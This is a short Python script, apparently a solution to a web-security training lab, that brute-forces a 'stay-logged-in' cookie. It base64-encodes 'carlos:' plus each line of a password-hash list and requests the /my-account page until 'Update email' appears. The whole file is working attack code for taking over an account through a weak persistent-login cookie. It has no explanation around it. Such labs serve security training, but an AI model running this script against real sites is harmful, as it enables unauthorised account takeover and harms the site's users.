import requests
import sys
import base64

def generate_cookie_value(word):
    data = f"carlos:{word}"
    encoded_data = base64.b64encode(data.encode()).decode()
    return encoded_data

def brute_force_attack(url, password_list):
    for password in password_list:
        cookie_value = generate_cookie_value(password.strip())
        cookies = {'stay-logged-in': cookie_value}

        response = requests.get(url, cookies=cookies)

        if "Update email" in response.text:
            print(f"Success! Password (hash) found: {password.strip()}")
            break
    else:
        print("Password not found.")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python script.py <url>")
        sys.exit(1)

    burp_url = sys.argv[1] + '/my-account'

    try:
        with open("hashed_passwords.txt", "r") as file:
            password_list = file.readlines()
    except FileNotFoundError:
        sys.exit(1)

    brute_force_attack(burp_url, password_list)
